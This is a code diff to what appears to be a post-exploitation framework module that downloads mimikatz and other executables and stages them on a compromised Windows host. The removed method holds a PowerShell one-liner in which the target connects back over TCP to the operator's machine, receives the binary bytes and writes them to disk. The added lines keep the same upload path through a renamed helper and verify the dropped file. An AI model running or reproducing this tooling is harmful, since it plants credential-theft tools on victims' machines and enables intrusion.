@@ -1,14 +1,12 @@
 from __future__ import annotations
 
 import os
-import select
 import tempfile
 import time
 import urllib.request
 import zipfile
 
 from koi.modules.blueprint import KoiModule
-from koi.utils.tcp import get_local_ip, spawn_send_server
 
 MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
 
@@ -50,41 +48,6 @@ class PopulateWinModule(KoiModule):
         finally:
             os.unlink(tmp_path)
 
-    def _upload_exe(self, raw: bytes, dest: str) -> bool:
-        """Upload raw bytes to *dest* on the target via a side TCP connection."""
-        local_ip = get_local_ip(self.session.addr[0])
-        port, thread, errors = spawn_send_server(raw, timeout=30)
-
-        ps_cmd = (
-            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-            f"$_s=$_c.GetStream();"
-            f"$_f=[IO.File]::OpenWrite('{dest}');"
-            f"$_b=New-Object byte[] 65536;"
-            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
-            f"$_f.Close();$_c.Close()"
-        )
-
-        if self.session.upgraded:
-            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-            time.sleep(0.3)
-            r, _, _ = select.select([self.session.conn], [], [], 1.0)
-            if r:
-                self.session.conn.recv(4096)
-        elif self.session.os_type == "windows_ps":
-            self.sendline(ps_cmd)
-        else:
-            escaped = ps_cmd.replace('"', '\\"')
-            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')
-
-        thread.join(timeout=30)
-
-        if errors:
-            return False
-
-        time.sleep(1.0)
-        check = self._win_query(f"(Test-Path '{dest}').ToString()")
-        return check.strip().lower() == "true"
-
     def run(self) -> None:
         out_dir = (self.args.output_dir or "C:\\Windows\\Temp").rstrip("\\")
 
@@ -98,7 +61,10 @@ class PopulateWinModule(KoiModule):
             with self.spinner(f"Fetching and uploading {name}…"):
                 try:
                     raw = self._fetch_url(url)
-                    ok  = self._upload_exe(raw, dest)
+                    ok  = self._upload_bytes(raw, dest)
+                    if ok:
+                        time.sleep(1.0)
+                        ok = self._win_query(f"(Test-Path '{dest}').ToString()").strip().lower() == "true"
                 except Exception as exc:
                     ok = False
                     results[name] = f"error: {exc}"
@@ -109,7 +75,10 @@ class PopulateWinModule(KoiModule):
         with self.spinner("Downloading mimikatz…"):
             try:
                 raw = self._fetch_mimikatz_exe()
-                ok  = self._upload_exe(raw, dest)
+                ok  = self._upload_bytes(raw, dest)
+                if ok:
+                    time.sleep(1.0)
+                    ok = self._win_query(f"(Test-Path '{dest}').ToString()").strip().lower() == "true"
             except Exception as exc:
                 ok = False
                 results["mimikatz.exe"] = f"error: {exc}"
